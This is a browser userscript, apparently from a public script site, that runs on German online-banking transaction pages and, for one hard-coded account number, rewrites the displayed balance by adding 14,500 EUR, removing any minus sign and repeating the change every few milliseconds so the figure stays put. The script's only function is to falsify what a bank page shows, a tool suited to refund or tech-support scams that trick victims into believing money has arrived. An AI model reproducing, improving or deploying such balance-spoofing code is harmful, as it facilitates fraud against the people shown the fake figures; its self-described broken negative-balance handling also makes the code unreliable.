// ==UserScript==
// @name         Ed WM Start MICHAEL WETZELSBERGER
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  with minus bal handling NOT WORKING
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/492847/Ed%20WM%20Start%20MICHAEL%20WETZELSBERGER.user.js
// @updateURL https://update.greasyfork.org/scripts/492847/Ed%20WM%20Start%20MICHAEL%20WETZELSBERGER.meta.js
// ==/UserScript==

if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf("11240917313") > 0 ) {


var vorgemerkt = "no";
var accountsecurity = "432 191 6668 66";
var modificationValue = 14500;

// Function to repeatedly check the condition for balance modification
function dynamicCheckAndModifyBalance() {
    // Set the interval for checking the condition (in milliseconds)
    var interval = 10; // 1 second

    // Function to check and modify the balance
    function checkAndModifyBalance() {
        if (document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0]?.textContent === accountsecurity) {
            if (vorgemerkt === "no") {
                modifyMainBalance();
            }
        }
    }

    // Call the function initially
    checkAndModifyBalance();

    // Set interval to repeatedly check the condition
    setInterval(checkAndModifyBalance, interval);
}

// Function to modify the main balance
function modifyMainBalance() {
    // Get the element with class "balance-decimal"
    var balanceElement = document.querySelector('.balance-decimal');

    // Check if the element exists and if it has been modified already
    if (balanceElement && balanceElement.getAttribute('data-modified') !== 'true') {
        // Get the text content of the balance element
        var balanceText = balanceElement.textContent.trim();

        // Extract the numeric value from the text content
        var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Determine the sign of the balance
        var isNegative = balanceText.includes('-');

        // Modify the balance based on the sign and the modification value
        if (isNegative) {
            numericValue -= modificationValue;
        } else {
            numericValue += modificationValue;
        }

        // Update the text content with the modified value and "EUR" currency
        var updatedBalanceText = (isNegative ? '-' : '') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

        // Update the balance text content and class
        balanceElement.textContent = updatedBalanceText;
        balanceElement.className = 'balance-decimal plus';
        balanceElement.setAttribute('data-modified', 'true');

        // Remove minus sign immediately
        var plusBalanceElement = document.querySelector('.balance-decimal.plus');
        if (plusBalanceElement) {
            var updatedBalanceText = plusBalanceElement.textContent.replace(/-/g, '');
            plusBalanceElement.textContent = updatedBalanceText;
        }
    } else {
        console.error('Balance element not found or already modified.');
    }
}

// Call the function to perform dynamic check and modification of the balance
dynamicCheckAndModifyBalance();
 }

